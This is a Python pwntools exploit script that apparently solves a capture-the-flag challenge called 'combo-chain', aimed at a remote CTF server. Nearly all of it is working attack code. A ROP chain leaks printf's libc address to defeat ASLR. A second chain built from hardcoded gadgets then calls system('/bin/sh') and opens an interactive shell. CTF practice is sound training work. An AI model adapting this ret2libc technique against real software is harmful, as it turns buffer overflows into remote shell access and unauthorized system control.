from pwn import *
#import pdb
exe = context.binary = ELF('combo-chain')
libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')

remotehost = ('ctf.fibonhack.it', 16002)

gdbscript = """
"""

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
        
io = start()

context.log_level = 'debug'
#pdb.set_trace()

##### Generation of unique sequences ####
#g = cyclic_gen()
#io.sendline(g.get(100))
#log.info(f"offset: {g.find(b'eaaa')}") #(16, 0, 16)

io.recvuntil(b"!: ", drop=True)

####### pop rdi gadget ########
# ropper -f combo-chain | grep 'rdi'
# 0x0000000000401263: pop rdi; ret;
pop_rdi_gadget = 0x0000000000401263

ret_gadget = 0x000000000040101a

bin_sh_offset = 0x1b3e1a

system_offset = 0x14b30

buff = flat({
	16: p64(pop_rdi_gadget) + p64(exe.got.printf) + p64(ret_gadget) + p64(exe.plt.printf) + p64(ret_gadget) + p64(exe.sym.main),
	100: b'A'
})
io.sendline(buff)
 
addr_printf = io.recv(6).ljust(8, b'\x00')
libc.address = u64(addr_printf) - libc.sym.printf
print(u64(addr_printf))

#io.recvuntil(b"!: ", drop=True)
io.recv()
'''
#get the address
buff = flat({
	16: p64(pop_rdi_gadget) + p64(exe.got.gets) + p64(ret_gadget) + p64(exe.plt.printf) + p64(exe.sym.main),
	100: b'A'
})
addr_gets = io.recv(6).ljust(8, b'\x00')
print(u64(addr_gets))


##### version with offset

buff = flat({
	16: p64(pop_rdi_gadget) + p64(libc.address + bin_sh_offset) + p64(libc.address + system_offset) ,
	100: b'A'
})
'''

buff = flat({
	16: p64(pop_rdi_gadget) + p64(next(libc.search(b'/bin/sh'))) + p64(ret_gadget) + p64(libc.sym.system) ,
	100: b'A'
})

io.sendline(buff)

io.interactive()